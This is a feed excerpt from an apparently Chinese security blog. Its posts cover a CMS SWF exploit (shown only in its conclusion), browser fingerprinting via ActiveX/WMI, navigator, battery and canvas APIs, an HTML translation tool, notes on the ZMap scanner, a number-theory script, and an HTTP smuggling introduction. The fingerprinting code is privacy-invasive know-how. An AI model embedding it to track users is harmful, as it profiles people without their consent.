&lt;h2 id=&quot;0x04-写在后面&quot;&gt;&lt;a href=&quot;#0x04-写在后面&quot; class=&quot;headerlink&quot; title=&quot;0x04 写在后面&quot;&gt;&lt;/a&gt;0x04 写在后面&lt;/h2&gt;&lt;p&gt;毫无疑问的是，利用上述方法实现的漏洞利用还很有限，如果熟悉ActionScript的话就可以直接敲代码来实现更复杂的逻辑，进而实现更强大的功能，而且这种利用方式如果结合软件本身自带的一些JS插件（比如有一个上传的JS脚本，但是应用本身的实现是无法利用的，那么我们或许可以自己写一个swf来加载js上传文件？），说不定有意想不到的效果。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;年前学习审计的时候找到的一个CMS的小漏洞，漏洞的发现过程没有什么值得特别介绍的，不过flash的swf文件利用方法之前没有了解过，借此机会学习一下。&lt;br&gt;
    
    </summary>
    
      <category term="审计" scheme="http://phantom0301.cc/categories/%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="CVE" scheme="http://phantom0301.cc/tags/CVE/"/>
    
      <category term="swf" scheme="http://phantom0301.cc/tags/swf/"/>
    
  </entry>
  
  <entry>
    <title>前端用户指纹识别实践</title>
    <link href="http://phantom0301.cc/2016/12/08/jsuser/"/>
    <id>http://phantom0301.cc/2016/12/08/jsuser/</id>
    <published>2016-12-08T11:47:31.000Z</published>
    <updated>2016-12-09T01:58:25.813Z</updated>
    
    <content type="html">&lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-突破与困境&quot;&gt;&lt;a href=&quot;#0x01-突破与困境&quot; class=&quot;headerlink&quot; title=&quot;0x01 突破与困境&quot;&gt;&lt;/a&gt;0x01 突破与困境&lt;/h2&gt;&lt;p&gt;在之前的博客里提到，曾经的那个网页和浏览器都很单纯的年代，网站服务端们靠着bling、bling的五颜六色的文字吸引着浏览器们的眼球，一切都是那么的相安无事，岁月静好。&lt;/p&gt;
&lt;p&gt;可是，蜜月不长，浏览器们就学会了提交一些不正常的数据给服务端，来让服务端出错。&lt;/p&gt;
&lt;p&gt;又过了一段时间，浏览器们需要服务端不断地视觉刺激，于是服务端们在原本单一的HTML排版中加入了动态语言来实现更多的逻辑，然而这远远满足不了上帝的口味，接下来，CSS/JS/HTML5等提供更强大视觉效果和交互功能的体系被用在前端的展示中。&lt;/p&gt;
&lt;p&gt;能力越大，责任越大，功能强劲的函数被编写支持，它的能力所带来的反噬效果也就越强大。原本用来突破性能瓶颈，优化用户体验的功能恰恰也带来了前端安全的困境。&lt;/p&gt;
&lt;h2 id=&quot;0x02-体验与隐私&quot;&gt;&lt;a href=&quot;#0x02-体验与隐私&quot; class=&quot;headerlink&quot; title=&quot;0x02 体验与隐私&quot;&gt;&lt;/a&gt;0x02 体验与隐私&lt;/h2&gt;&lt;p&gt;想要更好的体验吗？用你的隐私来交换吧~&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.ActiveXObject对象，被禁断的危险。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ActiveX 是一套广泛用于提供视频、动画内容的控件。它是微软的一个扩展，由于显而易见的危险，它只在IE中被支持，并且默认都是关闭的。即便你强行打开它的效果，现在的windows也会一直提醒你“赶快关上，没什么好用的”。总之，它是已经被封印了的及其危险的家伙，让我们一窥它的效果。&lt;br&gt;逻辑代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var locator = new ActiveXObject (&amp;quot;WbemScripting.SWbemLocator&amp;quot;); 
var service = locator.ConnectServer(&amp;quot;.&amp;quot;); 
var properties = service.ExecQuery(&amp;quot;SELECT * FROM Win32_Processor&amp;quot;);  
info+=&amp;quot;&amp;lt;tr  bgcolor=&amp;apos;#CDEDED&amp;apos; style=&amp;apos;font-weight: bold;&amp;apos; &amp;gt;&amp;lt;td width=&amp;apos;450&amp;apos; &amp;gt;CPU 信息&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
for (;!e.atEnd();e.moveNext ()) {   
    var p = e.item ();   
    info+=&amp;quot;&amp;lt;tr style=&amp;apos;color: red&amp;apos;&amp;gt;&amp;lt;td &amp;gt;CPU序列号:&amp;quot; + p.ProcessorID + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;&amp;quot;+p.Caption+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU编号：&amp;quot;+p.DeviceID+&amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU型号：&amp;quot; + p.Name + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU状态：&amp;quot; + p.CpuStatus + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CPU可用性：&amp;quot; + p.Availability + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;CUP Level：&amp;quot; + p.Level + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;主机名称：&amp;quot; + p.SystemName + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;;  
    info+=&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td &amp;gt;Processor Type：&amp;quot; + p.ProcessorType + &amp;quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;; 
}
return info;
}
fnShowPrcName(&amp;quot;Win32_StartupCommand&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;效果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161208204109.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如上所示，这种方式可以获取系统级的信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.navigator组函数，技能各异的兄弟。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Navigator对象包含了有关浏览器的信息，不同浏览器对它的支持各不相同，那么首先通过调用函数的回显就可以判断不同的浏览器了，主要在Firefox下对这一对象的方法进行了测试，以下函数都可以作为用户身份的一个分析维度。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;appCodeName，浏览器代码名————“Mozilla”&lt;/p&gt;
&lt;p&gt;appName，浏览器名————“Netscape”&lt;/p&gt;
&lt;p&gt;appVersion，浏览器版本————“5.0 (Windows)”&lt;/p&gt;
&lt;p&gt;languages，浏览器语言————[“zh-CN”, “zh”, “en-US”, “en”]&lt;/p&gt;
&lt;p&gt;oscpu，系统CPU————“Windows NT 10.0; WOW64”&lt;/p&gt;
&lt;p&gt;userAgent，不用多说&lt;/p&gt;
&lt;p&gt;plugins[]，浏览器安装插件&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里首先要说一下这一个参数，通过获取浏览器安装的插件，其实我们就可以判断出一部分用户所安装过的应用，尤其是杀毒软件、社交软件、支付软件等往往会安装相应的浏览器插件，那么通过这些信息的获取，就可以作为用户异度的另一个参数。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;getBattery()，当前电池参数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这是我想说的另一个点，我们知道如果使用移动设备访问网站，那么一方面不同用户访问时的电池状态会存在差异性，另一方面在短时间内，同一用户的电池状态存在一定稳定性，甚至是一个连贯的变化过程，那么通过获取电池状态信息就可以辅助我们判断用户身份。&lt;/p&gt;
&lt;p&gt;一个简单的脑洞就是，构建相应的电池信息三元组，通过计算欧几里得距离来构建相关性图景。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;geolocation，地理位置获取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个需要用户在浏览器同意定位，在没有一个完整的IP地理库时，这也是一种画像手段。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;more&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;除了以上列举出的部分函数外，一些基于移动设备的调用在某些特殊应用场合也可以来对用户身份进行识别。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.Canvas,你的个性绘图函数。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cookie追踪手段是众所周知的用户画像手法，而另一种被广泛提到且有效的手段就是Canvas绘图指纹。&lt;/p&gt;
&lt;p&gt;Canvas作为HTML5中重要的绘图手段，被证实在绘制图形时，不同机器的不同浏览器对函数的实现都有略微的差别，而这种差异就可以很好的作为用户标记的手段。&lt;/p&gt;
&lt;p&gt;具体来龙去脉这篇文章讲的很清楚，而且已经有现成的JS实现，这里就不在多说。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/miyeah/p/3967494.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/miyeah/p/3967494.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x03-小DEMO&quot;&gt;&lt;a href=&quot;#0x03-小DEMO&quot; class=&quot;headerlink&quot; title=&quot;0x03 小DEMO&quot;&gt;&lt;/a&gt;0x03 小DEMO&lt;/h2&gt;&lt;p&gt;如果希望测试我上面提到的各种好玩的信息获取，可以访问以下地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://123.207.68.169/test.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;A little demo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过，请注意，访问之前请充分考虑您对于隐私的顾虑，我能够做的保证是：&lt;/p&gt;
&lt;p&gt;一、不在我博客的网页中使用相应代码；&lt;/p&gt;
&lt;p&gt;二、demo中只是把信息回显到您的浏览器，不做任何信息收集保留；&lt;/p&gt;
&lt;p&gt;三、为了不被他人利用，DEMO中的代码经过了混淆。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;声明：郑重声明我不会在自己的博客页面里嵌入这里提到的任何代码。&lt;br&gt;
    
    </summary>
    
      <category term="Javascript" scheme="http://phantom0301.cc/categories/Javascript/"/>
    
    
      <category term="html5" scheme="http://phantom0301.cc/tags/html5/"/>
    
      <category term="javascript" scheme="http://phantom0301.cc/tags/javascript/"/>
    
      <category term="身份识别" scheme="http://phantom0301.cc/tags/%E8%BA%AB%E4%BB%BD%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>Python实现网页解析翻译</title>
    <link href="http://phantom0301.cc/2016/12/02/htmlparser/"/>
    <id>http://phantom0301.cc/2016/12/02/htmlparser/</id>
    <published>2016-12-02T10:32:34.000Z</published>
    <updated>2016-12-08T06:12:06.851Z</updated>
    
    <content type="html">&lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-需求&quot;&gt;&lt;a href=&quot;#0x01-需求&quot; class=&quot;headerlink&quot; title=&quot;0x01 需求&quot;&gt;&lt;/a&gt;0x01 需求&lt;/h2&gt;&lt;p&gt;最近需要写程序翻译一批英文网页，要求翻译后的网页排版样式基本不变。经过前期测试发现，Google和Bing的在线翻译可以直接识别出HTML的标签：&lt;/p&gt;
&lt;p&gt;类似这样，看起来很舒心~~：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/qweasdwfdeqw20161202201213.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;换做度娘，Oh~：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/rhsrthser20161202201502.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;本以为是因为度娘没有做网页翻译插件的打算，所以没这个功能，但是查证后发现——其实百度是支持网页翻译的——也就是理论上应该可以识别网页标签，也许是我的姿势不对  (O.O)_?  求证大家的操作心得。&lt;/p&gt;
&lt;p&gt;总之，在正常的百度翻译API调用下无法实现很好的解析翻译网页，而能够实现这一功能的另两位也有客观上的难度，Google就不用说了，如果要调用就需要在程序上挂一个代理；那么，Bing这厮呢？要申请它的API过程太繁琐，一是大陆这边好像这项服务选项为空，另外通过其他手段拿到的好像也是试用key。最终，决定自己写个中间件，处理标签后送入百度，拿到翻译结果再重组标签。&lt;/p&gt;
&lt;h2 id=&quot;0x02-框架&quot;&gt;&lt;a href=&quot;#0x02-框架&quot; class=&quot;headerlink&quot; title=&quot;0x02 框架&quot;&gt;&lt;/a&gt;0x02 框架&lt;/h2&gt;&lt;p&gt;决定自己写处理程序后面临两种选择，一种是一个网页每对闭合标签调用一次API，另一种是一个网页一次性全部翻译后再分割。&lt;/p&gt;
&lt;p&gt;两种方法的不同之处在于，前者实现简单，但是每个网页多次调用API增加时间开销且浪费API调用次数，所以使用第二种方式实现。&lt;/p&gt;
&lt;p&gt;预期结构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;读取网页 ——&amp;gt; 剔除标签，生成文本&amp;amp;标签数组 ——&amp;gt; 数组文本翻译
                                             |
                                            \ /
翻译完成  &amp;lt;—— 标签数组，文本数组组合  &amp;lt;—— 结果重分割数组
&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;
&lt;li&gt;剔除标签，生成文本标签数组。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Python下有很多好用的HTML解析包，例如BS4，lxml，xpath等等，但是它们的封装都很高级，这里我只需要最简单的识别出标签和文本，所以使用代码更简单的HTMLParser来实现。&lt;/p&gt;
&lt;p&gt;HTMLParser是一个基于正则匹配的解析包，它写好了HTML的正则规则，提供了一个类给使用者继承，个人觉得包本身的核心是它的 &lt;em&gt;goahead&lt;/em&gt; 函数，利用这种步步识别的方法来解析HTML。&lt;/p&gt;
&lt;p&gt;继承的类中，重写了如下方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def handle_starttag(self, tag, attrs):
    attr = &amp;apos;&amp;apos;
    for i in attrs:
        attr = i[0]+&amp;apos;=&amp;apos;+i[1]  # 恢复标签属性值
    if attr == &amp;apos;&amp;apos;:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
    else:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
def handle_endtag(self, tag):
    self.parser_dic.append(&amp;apos;&amp;lt;/&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
def handle_startendtag(self, tag, attrs):
    attr = &amp;apos;&amp;apos;
    for i in attrs:
        attr = i[0]+&amp;apos;=&amp;apos;+&amp;apos;&amp;quot;&amp;apos;+i[1]+&amp;apos;&amp;quot;&amp;apos;
    if attr == &amp;apos;&amp;apos;:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos;&amp;gt;&amp;apos;)
    else:
        self.parser_dic.append(&amp;apos;&amp;lt;&amp;apos;+tag+&amp;apos; &amp;apos;+attr+&amp;apos;&amp;gt;&amp;apos;)
def handle_data(self, data):
    self.parser_dic.append(data)
def handle_comment(self, data):
    self.parser_dic.append(&amp;apos;&amp;lt;!-- --&amp;gt;&amp;apos;)
def handle_entityref(self, name):
    self.parser_dic.append(&amp;apos;&amp;amp;&amp;apos;+name+&amp;apos;;&amp;apos;)
def handle_charref(self, name):
    self.parser_dic.append(&amp;apos;&amp;amp;#&amp;apos;+name+&amp;apos;;&amp;apos;)
def output(self):
    return self.parser_dic
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过调用父类中的 &lt;em&gt;feed&lt;/em&gt; 方法来解析网页，解析结果输出成为一个按照顺序排列的标签和文本混合的数组。&lt;/p&gt;
&lt;p&gt;遍历数组，提取文本数组，遍历文本数组，添加分割符，组合成一个含有分隔符的文本。&lt;/p&gt;
&lt;p&gt;混合数组如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/dhdjdtj20161202211106.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;添加分割符如下：&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202212045.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;2.数组翻译&lt;/p&gt;
&lt;p&gt;直接将含有分隔符的文本按照百度API调用规则发送，这个不需要多说。&lt;/p&gt;
&lt;p&gt;3.结果重分割&lt;/p&gt;
&lt;p&gt;使用文本自带的 &lt;em&gt;split&lt;/em&gt; 或者正则的对应函数分割之前的分隔符，形成文本数组&lt;/p&gt;
&lt;p&gt;4.标签重组&lt;/p&gt;
&lt;p&gt;这一部分就是重新遍历之前的标签文本混合数组，遇见非标签的内容，就用翻译后的文本数组替换，这样依次替换完成就可以实现保留标签的文本翻译。&lt;/p&gt;
&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;实际操作绝大多数情况下是可行的。&lt;/p&gt;
&lt;p&gt;但是也有些问题，一是百度API一次翻译的字数有限，这就意味着，还需要做文本分割，而分割时又要考虑标签的完整性。二是分割符的选择，分隔符有时候也会引起翻译结果的混乱，初步测试使用“|”相对效果较好，后期可能使用多个分割符来防止分割符和文本本身符号混淆。&lt;/p&gt;
&lt;p&gt;最后放一张整个完成后的翻译效果图&lt;br&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20161202213133.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;先不说主流的几款提供翻译接口的产品在翻译的水准上如何，就HTML标签识别来说，度娘恐怕没有谷歌和必应做的好。&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.cc/categories/python/"/>
    
    
      <category term="htmlparser" scheme="http://phantom0301.cc/tags/htmlparser/"/>
    
      <category term="python" scheme="http://phantom0301.cc/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Zmap论文简读</title>
    <link href="http://phantom0301.cc/2016/10/27/Zmapread/"/>
    <id>http://phantom0301.cc/2016/10/27/Zmapread/</id>
    <published>2016-10-27T03:00:29.000Z</published>
    <updated>2016-10-27T03:36:19.940Z</updated>
    
    <content type="html">&lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-诞生&quot;&gt;&lt;a href=&quot;#0x01-诞生&quot; class=&quot;headerlink&quot; title=&quot;0x01 诞生&quot;&gt;&lt;/a&gt;0x01 诞生&lt;/h2&gt;&lt;p&gt;一直以来，丈量日渐庞大的互联网就是研究者们的探索方向之一，和攻击者使用的探测手法，比如僵尸网络或者蠕虫相比，研究者能够利用的方法十分有限，于是，Zmap诞生了。&lt;/p&gt;
&lt;p&gt;在此之前，除了每一位致力于此的研究者自己编写的程序外，最有效的工具应该是Nmap，这已经是十分优秀的探测工具，但是它还是不够快，如果打算利用Nmap去扫描整个网络空间，花费的时间单位将以天计。&lt;/p&gt;
&lt;h2 id=&quot;0x02-性能&quot;&gt;&lt;a href=&quot;#0x02-性能&quot; class=&quot;headerlink&quot; title=&quot;0x02 性能&quot;&gt;&lt;/a&gt;0x02 性能&lt;/h2&gt;&lt;p&gt;官方给出的性能版本是：单台入门级服务器在千兆以太网速度下扫描整个IPv4空间需要45分钟。&lt;/p&gt;
&lt;p&gt;在同等准确度的限制下，它是使用agressive default策略的Nmap扫描速度的1300倍。&lt;/p&gt;
&lt;p&gt;Zmap能够将当前带宽的利用率提升到97%&lt;/p&gt;
&lt;h2 id=&quot;0x03-优化&quot;&gt;&lt;a href=&quot;#0x03-优化&quot; class=&quot;headerlink&quot; title=&quot;0x03 优化&quot;&gt;&lt;/a&gt;0x03 优化&lt;/h2&gt;&lt;p&gt;为了提高扫描速度，Zmap采用以下策略进行扫描探测优化：&lt;/p&gt;
&lt;p&gt;首先，Zmap跳过TCP/IP堆栈，直接在链路层使用以太网帧；&lt;br&gt;其次，对于目标列表的选取使用随机抽样，这样避免顺序扫描导致的对方网络负载过大。通过采用乘法循环群随机序列来保证生成稠密且唯一的随机数；&lt;br&gt;使用类似SYN cookies的方式来避免存储包交互时的序列状态确认；&lt;br&gt;使用根树，一种处理范围和使用频率的路由表来排除特殊的地址空间；&lt;br&gt;最后，在扫描过程中，允许丢失少量的扫描数据。&lt;/p&gt;
&lt;h2 id=&quot;0x04-验证&quot;&gt;&lt;a href=&quot;#0x04-验证&quot; class=&quot;headerlink&quot; title=&quot;0x04 验证&quot;&gt;&lt;/a&gt;0x04 验证&lt;/h2&gt;&lt;p&gt;通过实验对比，Zmap的命中率与扫描速度无关，同时对于探测的覆盖率和扫描时刻的影响进行的比较。&lt;/p&gt;
&lt;p&gt;在和Nmap的比较中我们可以看出，Nmap更适合单目标多端口的探测，而Zmap则侧重于多目标单端口的扫描环境。&lt;/p&gt;
&lt;h2 id=&quot;0x05-实际部署&quot;&gt;&lt;a href=&quot;#0x05-实际部署&quot; class=&quot;headerlink&quot; title=&quot;0x05 实际部署&quot;&gt;&lt;/a&gt;0x05 实际部署&lt;/h2&gt;&lt;p&gt;如果你是出于善意的角度使用Zmap去测量网络空间，在使用工具时，应该注意以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保持与网络管理员的联系，注意Zmap对当前的网络带宽环境带来的影响。&lt;/li&gt;
&lt;li&gt;在机器的源地址上放一个简单的网页声明，对于扫描源IP进行DNS解析，方便其他机构辨识。&lt;/li&gt;
&lt;li&gt;适当减缓扫描速度，使用灵活的扫描策略，降低可能的影响。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;0x06-发展&quot;&gt;&lt;a href=&quot;#0x06-发展&quot; class=&quot;headerlink&quot; title=&quot;0x06 发展&quot;&gt;&lt;/a&gt;0x06 发展&lt;/h2&gt;&lt;p&gt;这是论文里提到的未来Zmap的发展之路，不过这篇论文已经是3年前的了，其中提到的一些设想说不定已经实现。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;IPv6空间扫描&lt;/li&gt;
&lt;li&gt;单IP多域名多证书扫描&lt;/li&gt;
&lt;li&gt;类似robot的扫描圈君子协定&lt;/li&gt;
&lt;li&gt;更快的速度，甚至于实现建立某一时刻的网络地址空间快照&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;很早之前就读到过其他大大使用Zmap做测试的文章，自己也玩了一下这个快速的扫描工具，但是一直对于它的认识处在黑盒的状态，所以这次浏览了一遍Zmap的论文，对于论文里面提到的点进行记录。&lt;/p&gt;
    
    </summary>
    
      <category term="工具" scheme="http://phantom0301.cc/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="Zmap" scheme="http://phantom0301.cc/tags/Zmap/"/>
    
      <category term="scanner" scheme="http://phantom0301.cc/tags/scanner/"/>
    
  </entry>
  
  <entry>
    <title>数论基础-原根与指标</title>
    <link href="http://phantom0301.cc/2016/10/15/primitiveroot/"/>
    <id>http://phantom0301.cc/2016/10/15/primitiveroot/</id>
    <published>2016-10-15T09:48:34.000Z</published>
    <updated>2016-12-08T06:19:34.754Z</updated>
    
    <content type="html">&lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;思维导图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/pic/ac1c3f15dcf2f7dc.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;三位数内的原根求解程序，如果验证有错，欢迎指出~~：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#! /usr/bin/env python
# -*- coding=UTF-8 -*-

def gcd(a, b):  # 求最大公约数
    while b != 0:
        (a,b) = (b, a%b)
    return a

def factorize(n, wheel=3):  # 因数分解
    if n &amp;lt; 2:
        return []
    primes = (2, 3, 5, 7, 11)
    if wheel &amp;lt; 2 or wheel &amp;gt; len(primes):
        wheel = 3
    primes = primes[:wheel]
    q = []
    for p in primes:
        if n % p != 0:
            continue
        e = 1
        n //= p
        while n % p == 0:
            n //= p
               e += 1
        q.append((p, e))
    if n &amp;gt; 1:
        m = reduce(lambda x, y:x*y, primes, 1)
        offs = [x for x in xrange(2, m + 1) if gcd(m, x) == 1] + [m + 1]
        k, done = 0, False
        while n &amp;gt; 1:
            for offset in offs:
                p = k + offset
                if p ** 2 &amp;gt; n:
                    done = True
                    break
                if n % p != 0:
                    continue
                e = 1
                n //= p
                while n % p == 0:
                    n //= p
                    e += 1
                q.append((p, e))
            if done:
                break
            k += m
        if n &amp;gt; 1:
            q.append((n, 1))
    return q

def Euler(n, wheel=3):  # 求欧拉函数
    &amp;apos;&amp;apos;&amp;apos; Euler Totient Function of n using a prime wheel criterion.
        It&amp;apos;s almost as fast as the phi(n, p) function &amp;apos;&amp;apos;&amp;apos;
    if n &amp;lt; 2:
        return n
    q = factorize(n, wheel)
    r = 1
    for (p, e) in q:
        r *= (p - 1) * (p ** (e - 1))
    return r

def primitive_root(mod):  # 求原根
    simple = []
    root = []
    phi_m = Euler(mod)
    for i in range(1,mod):
        if gcd(i, mod) == 1:
            simple.append(i)
    for a in simple:
        for j in range(1,phi_m+1):
            if a ** j % mod == 1:
                if j == phi_m:
                    root.append(a)
                else:
                    break

    return root

if __name__ == &amp;apos;__main__&amp;apos;:
    mod = raw_input(&amp;apos;Please input mod:&amp;apos;)
    print primitive_root(int(mod))`
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;数论基础部分有关于原根和指标的学习脑图。&lt;br&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.cc/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="原根" scheme="http://phantom0301.cc/tags/%E5%8E%9F%E6%A0%B9/"/>
    
      <category term="指标" scheme="http://phantom0301.cc/tags/%E6%8C%87%E6%A0%87/"/>
    
      <category term="数论" scheme="http://phantom0301.cc/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>没能复现的学习——DEFCON-HTTP-Smuggling</title>
    <link href="http://phantom0301.cc/2016/09/12/httpsmuggling/"/>
    <id>http://phantom0301.cc/2016/09/12/httpsmuggling/</id>
    <published>2016-09-12T12:44:03.000Z</published>
    <updated>2016-09-19T13:27:33.228Z</updated>
    
    <content type="html">&lt;p&gt;这篇文章主体框架来自@regilero在DEFCON上的议题-HTTP smuggling is a thing we should know better and care about.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-闲扯Host-header&quot;&gt;&lt;a href=&quot;#0x00-闲扯Host-header&quot; class=&quot;headerlink&quot; title=&quot;0x00 闲扯Host header&quot;&gt;&lt;/a&gt;0x00 闲扯Host header&lt;/h2&gt;&lt;p&gt;作为重度网络依赖人群，我们每天都使用程序将数百次网页请求抛送到无形的网络空间中去，我们告知网络服务器我们要访问的资源，接受何种格式、何种语言的回应，是否要和服务器维持一段时间的连接，是否需要保存一些状态以及告知服务器你的代理发送人（浏览器或其他）身份。但是我们了解我们发送的这些东西的真正含义吗？&lt;/p&gt;
&lt;p&gt;其实作为一次网页请求，理论上我们只要告诉服务器我们要的资源url就可以。那么那些多余的键值大体起什么作用呢？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Accept族，这里的一系列字段决定了客户端接收的类型、压缩方式、字符集、语言等。这一类字段似乎是为了客户体验而产生的，它允许客户对自己喜欢的语言、字符集进行选择，并且提供选择因子“q”来界定对不同资源的喜好程度，q值越大越喜爱。而压缩则提供了更小的带宽占用和更快的访问速度。&lt;/li&gt;
&lt;li&gt;Cache-Control，缓存控制机制&lt;/li&gt;
&lt;li&gt;Connection,通常的参数会使用Keep-Alive，这个字段实际上算是对HTTP基础的补充，通过这个字段来使客户端到服务端的连接持续有效。而这个字段就是下面所描述问题的基础之一&lt;/li&gt;
&lt;li&gt;Cookie，用户体验与隐私、安全势不两立的存在，被广泛研究介绍，就不用多说了。&lt;/li&gt;
